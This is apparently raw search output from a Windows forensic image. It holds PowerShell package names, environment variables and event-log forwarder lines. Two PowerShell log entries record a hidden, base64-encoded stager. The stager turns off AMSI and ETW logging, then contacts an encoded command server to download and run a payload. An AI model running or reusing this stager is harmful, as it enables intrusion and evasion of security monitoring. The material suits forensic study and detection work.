+MICROSOFT-ACTIVEDIRECTORY-POWERSHELL-PACKAGE~31BF3856AD364E35~AMD64~~10.0.17763.1
+MICROSOFT-ACTIVEDIRECTORY-POWERSHELL-PACKAGE~31BF3856AD364E35~AMD64~EN-US~10.0.17763.1
+MICROSOFT-NANOSERVER-CORE-FAILOVERCLUSTERSET-POWERSHELL-PACKAGE~31BF3856AD364E35~AMD64~~10.0.17763.1
+08-30-2024 16:18:51.912 -0700 INFO  TailReader [2784 tailreader0] - Archive file='C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx' updated less than 10000ms ago, will not read it until it stops changing. File size=1118208
+08-30-2024 16:18:52.914 -0700 INFO  TailReader [2784 tailreader0] - Archive file='C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx' updated less than 10000ms ago, will not read it until it stops changing. File size=2166784
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+%systemroot%\system32\windowspowershell\v1.0\powershell_ise.exe
+2024 16:14:34.865 -0700 INFO  WinEventLogInputProcessor [3068 WinEventLogInputProcessor] - main-thread: Finished processing existing Windows Event Log 'C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4OperationaE
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+MICROSOFT-ACTIVEDIRECTORY-POWERSHELL-PACKAGE~31BF3856AD364E35~AMD64~~10.0.17763.1
+MICROSOFT-ACTIVEDIRECTORY-POWERSHELL-PACKAGE~31BF3856AD364E35~AMD64~EN-US~10.0.17763.1
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+PowerShell2CFAB8
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+08-30-2024 16:16:54.405 -0700 INFO  TailReader [2784 tailreader0] - Archive file='C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx' updated less than 10000ms ago, will not read it until it stops changing. File size=1118208
+Microsoft-Windows-FailoverCluster-PowerShell-Nano-Package~31bf3856ad364e35~amd64~en-US~10.0.17763.1.cat|!
+_path7C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx
+LogName=Windows PowerShell
+SourceName=PowerShell
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -w Hidden -enc SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAJABSAGUAZgA9AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdAB2AGEAbAB1AGUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBFAHYAZQBuAHQAaQBuAGcALgBFAHYAZQBuAHQAUAByAG8AdgBpAGQAZQByAF0ALgBHAGUAdABGAGkAZQBsAGQAKAAnAG0AXwBlAG4AYQBiAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwASQBuAHMAdABhAG4AYwBlACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBUAHIAYQBjAGkAbgBnAC4AUABTAEUAdAB3AEwAbwBnAFAAcgBvAHYAaQBkAGUAcgAnACkALgBHAGUAdABGAGkAZQBsAGQAKAAnAGUAdAB3AFAAcgBvAHYAaQBkAGUAcgAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAEcAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAApACwAMAApADsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQB6AEEAQwA0AEEATQBRAEEAMABBAEQAQQBBAEwAZwBBAHoAQQBEAE0AQQBMAGcAQQB4AEEARABJAEEATQBBAEEANgBBAEQAawBBAE0AQQBBAHcAQQBEAE0AQQAnACkAKQApADsAJAB0AD0AJwAvAG4AZQB3AHMALgBwAGgAcAAnADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAB3AGMALgBQAHIAbwB4AHkAPQBbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEQAZQBmAGEAdQBsAHQAVwBlAGIAUAByAG8AeAB5ADsAJAB3AGMALgBQAHIAbwB4AHkALgBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AQwByAGUAZABlAG4AdABpAGEAbABDAGEAYwBoAGUAXQA6ADoARABlAGYAYQB1AGwAdABOAGUAdAB3AG8AcgBrAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAB3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAHkAdABlAHMAKAAnACEAaAB6ACUAMgB4ADYAbQB0AEMAMABBAGUAWQBWACwANQBXAGoAdQA4ADQALwBbAHMAbgBMAGEAWABIAF8ARAAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AG4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAHgAbwByACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIAcgByAHYAaABiAGEAeAA9AHoAegBFADIAYQBuAGMAaQBjAG8ARgBoAG8AdwBJAGUAcAB1AFAASABkAHoANQAvAE8AZwBrAD0AIgApADsAJABkAGEAdABhAD0AJAB3AGMALgBEAG8AdwBuA
+Microsoft-Windows-FailoverCluster-PowerShell-Package~31bf3856ad364e35~amd64~~10.0.17763.1
+Microsoft-Windows-PowerShell-ServerCore-WOW64-Package~31bf3856ad364e35~amd64~~10.0.17763.1
+Microsoft-Windows-PowerShell-V2-ServerCore-Package~31bf3856ad364e35~amd64~~10.0.17763.1
+Microsoft-Windows-PowerShell-V2-ServerCore-WOW64-Package~31bf3856ad364e35~amd64~~10.0.17763.1
+Microsoft-PowerShell-DSC-PullServer-Package~31bf3856ad364e35~amd64~~10.0.17763.1
+_path7C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx
+LogName=Windows PowerShell
+SourceName=PowerShell
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -w Hidden -enc SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAJABSAGUAZgA9AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdAB2AGEAbAB1AGUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBFAHYAZQBuAHQAaQBuAGcALgBFAHYAZQBuAHQAUAByAG8AdgBpAGQAZQByAF0ALgBHAGUAdABGAGkAZQBsAGQAKAAnAG0AXwBlAG4AYQBiAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwASQBuAHMAdABhAG4AYwBlACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBUAHIAYQBjAGkAbgBnAC4AUABTAEUAdAB3AEwAbwBnAFAAcgBvAHYAaQBkAGUAcgAnACkALgBHAGUAdABGAGkAZQBsAGQAKAAnAGUAdAB3AFAAcgBvAHYAaQBkAGUAcgAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAEcAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAApACwAMAApADsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQB6AEEAQwA0AEEATQBRAEEAMABBAEQAQQBBAEwAZwBBAHoAQQBEAE0AQQBMAGcAQQB4AEEARABJAEEATQBBAEEANgBBAEQAawBBAE0AQQBBAHcAQQBEAE0AQQAnACkAKQApADsAJAB0AD0AJwAvAG4AZQB3AHMALgBwAGgAcAAnADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAB3AGMALgBQAHIAbwB4AHkAPQBbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEQAZQBmAGEAdQBsAHQAVwBlAGIAUAByAG8AeAB5ADsAJAB3AGMALgBQAHIAbwB4AHkALgBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AQwByAGUAZABlAG4AdABpAGEAbABDAGEAYwBoAGUAXQA6ADoARABlAGYAYQB1AGwAdABOAGUAdAB3AG8AcgBrAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAB3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAHkAdABlAHMAKAAnACEAaAB6ACUAMgB4ADYAbQB0AEMAMABBAGUAWQBWACwANQBXAGoAdQA4ADQALwBbAHMAbgBMAGEAWABIAF8ARAAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AG4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAHgAbwByACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIAcgByAHYAaABiAGEAeAA9AHoAegBFADIAYQBuAGMAaQBjAG8ARgBoAG8AdwBJAGUAcAB1AFAASABkAHoANQAvAE8AZwBrAD0AIgApADsAJABkAGEAdABhAD0AJAB3AGMALgBEAG8AdwBuAGwAb
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Microsoft-Windows-PowerShell/Admin
+Microsoft-Windows-PowerShell/Analytic
+Microsoft-Windows-PowerShell/Debug
+Microsoft-Windows-PowerShell/Operational
+chrome/devtools/modules/devtools/client/netmonitor/src/utils/powershell.jsPK
+08-30-2024 16:19:46.428 -0700 INFO  Metrics - group=per_source_thruput, series="c:\windows\system32\winevt\logs\microsoft-windows-powershell%4operational.evtx", kbps=0.162, eps=0.115, kb=9.893, ev=7, avg_age=39.857, max_age=41, interval_sec=60
+08-30-2024 16:19:46.428 -0700 INFO  Metrics - group=per_source_thruput, series="c:\windows\system32\winevt\logs\windows powershell.evtx", kbps=0.141, eps=0.049, kb=8.614, ev=3, avg_age=39.667, max_age=40, interval_sec=60
+08-30-2024 16:19:46.436 -0700 INFO  Metrics - group=per_sourcetype_thruput, series="wineventlog:microsoft-windows-powershell/operational", kbps=0.162, eps=0.115, kb=9.893, ev=7, avg_age=39.857, max_age=41, interval_sec=60
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+08-30-2024 16:08:10.262 -0700 INFO  WinEventLogInputProcessor [3068 WinEventLogInputProcessor] - main-thread: Processing existing Windows Event Log 'C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx'
+08-30-2024 16:08:10.291 -0700 INFO  WinEventLogInputProcessor [3068 WinEventLogInputProcessor] - main-thread: Finished processing existing Windows Event Log 'C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx': total_events='1' with empty_msg='0'.
+powershell.exe|bd2e1475245f53a2
+08-30-2024 16:06:41.314 -0700 INFO  TailReader [2784 tailreader0] - Archive file='C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx' has stopped changing, will read it now.
+08-30-2024 16:06:41.314 -0700 INFO  ArchiveProcessor [3040 archivereader] - Handling file=C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx
+08-30-2024 16:06:41.314 -0700 INFO  ArchiveProcessor [3040 archivereader] - Processing windows event log file C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx
+08-30-2024 16:06:41.314 -0700 INFO  WinEventLogInputProcessor [3068 WinEventLogInputProcessor] - main-thread: Processing existing Windows Event Log 'C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx'
+08-30-2024 16:06:41.314 -0700 INFO  WinEventLogInputProcessor [3068 WinEventLogInputProcessor] - main-thread: Finished processing existing Windows Event Log 'C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx': total_events='0' with empty_msg='0'.
+Microsoft-Windows-PowerShell
+Powershell
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+08-30-2024 16:03:30.332 -0700 INFO  Metrics - group=per_source_thruput, series="c:\windows\system32\winevt\logs\windows powershell.evtx", kbps=0.633, eps=0.148, kb=38.573, ev=9, avg_age=11.000, max_age=11, interval_sec=60
+08-30-2024 16:03:30.332 -0700 INFO  Metrics - group=per_sourcetype_thruput, series="wineventlog:windows powershell", kbps=0.633, eps=0.148, kb=38.573, ev=9, avg_age=11.000, max_age=11, interval_sec=60
+0e\x00c\x00u\x00r\x00i\x00t\x00y\x00-\x00A\x00u\x00dows Event Log 'C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx': total_events='3' with empty_msg='0'.
+08-30-2024 16:19:02.936 -0700 INFO  TailReader [2784 tailreader0] - Archive file='C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx' has stopped changing, will read it now.
+08-30-2024 16:19:02.936 -0700 INFO  ArchiveProcessor [3040 archivereader] - Handling file=C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx
+08-30-2024 16:19:02.936 -0700 INFO  ArchiveProcessor [3040 archivereader] - Processing windows event log file C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx
+08-30-2024 16:19:02.936 -0700 INFO  WinEventLogInputProcessor [3068 WinEventLogInputProcessor] - main-thread: Processing existing Windows Event Log 'C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx'
+08-30-2024 16:19:03.021 -0700 INFO  WinEventLogInputProcessor [3068 WinEventLogInputProcessor] - main-thread: Finished processing existing Windows Event Log 'C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx': total_events='7' with empty_msg='0'.
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+MICROSOFT.POWERSHELL.DSC.DEPLOYMENT-GROUP-PACKAGE~31BF3856AD364E35~AMD64~~10.0.17763.1
+        $PSHost = $AppDomain.Load([PSObject].Assembly.FullName).GetType('System.Management.Automation.PowerShell')::Create();
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\sys
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Microsoft-Windows-PowerShell-ServerCore-Package~31bf3856ad364e35~amd64~~10.0.17763.1
+Microsoft-Windows-iSCSITarget-PowerShell-Package~31bf3856ad364e35~amd64~~10.0.17763.1
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+Microsoft-Windows-FailoverCluster-Mgmt-Nano-Package~31bf3856ad364e35~amd64~en-US~10.0.17763.1.cat|Microsoft-Windows-FailoverCluster-PowerShell-Nano-Package~31bf3856ad364e35~amd64~en-US~10.0.17763.1.cat|!
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+08-30-2024 16:14:22.618 -0700 INFO  TailReader [2784 tailreader0] - Archive file='C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx' updated less than 10000ms ago, will not read it until it stops changing. File size=1118208
+08-30-2024 16:14:23.597 -0700 INFO  TailReader [2784 tailreader0] - Archive file='C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx' updated less than 10000ms ago, will not read it until it stops changing. File size=2166784
+  <Bookmark Channel='C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx' RecordId='223' IsCurrent='true'/>
+  <Bookmark Channel='C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx' RecordId='229' IsCurrent='true'/>
+Microsoft-Windows-PowerShell
+	source::C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx||WinEventLog:Windows PowerShell|
+Microsoft-ActiveDirectory-PowerShell-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat|!
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\sys
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+08-30-2024 16:10:37.186 -0700 INFO  TailReader [2784 tailreader0] - Archive file='C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx' updated less than 10000ms ago, will not read it until it stops changing. File size=2166784
+08-30-2024 16:10:37.201 -0700 INFO  TailReader [2784 tailreader0] - Archive file='C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx' updated less than 10000ms ago, will not read it until it stops changing. File size=1118208
+Microsoft-NanoServer-Core-FailoverClusterSet-Powershell-Package~31bf3856ad364e35~amd64~en-US~0.0.0.0
+hsPowerShellh
+powershell_ise.exe
+wsPowerShell
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Microsoft-Windows-PowerShell/Admin
+Microsoft-Windows-PowerShell/Analytic
+Microsoft-Windows-PowerShell/Debug
+Microsoft-Windows-PowerShell/Operational
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Microsoft-Windows-PowerShell-ISE-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package01612~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package0201621~31bf3856ad364e35~amd64~~10.0.17763.1.cat|!
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Microsoft-Windows-Network-Security-MPSSVC-PowerShell-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Network-Security-MPSSVC-PowerShell-WOW64-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package01612~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package01811~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package0201621~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package0201820~31bf3856ad364e35~amd64~~10.0.17763.1.cat|!
+08-30-2024 16:08:35.476 -0700 INFO  Metrics - group=per_source_thruput, series="c:\windows\system32\winevt\logs\windows powershell.evtx", kbps=0.071, eps=0.016, kb=4.333, ev=1, avg_age=40.000, max_age=40, interval_sec=60
+08-30-2024 16:08:35.476 -0700 INFO  Metrics - group=per_sourcetype_thruput, series="wineventlog:windows powershell", kbps=0.071, eps=0.016, kb=4.333, ev=1, avg_age=40.000, max_age=40, interval_sec=60
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+powershell_RASAPI32
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Microsoft-Windows-PowerShell-ServerCore-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package01612~31bf3856ad364e35~amd64~~10.0.17763.1.cat|!
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+Microsoft-Windows-Networking-RemoteAccess-PowerShell-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat|!
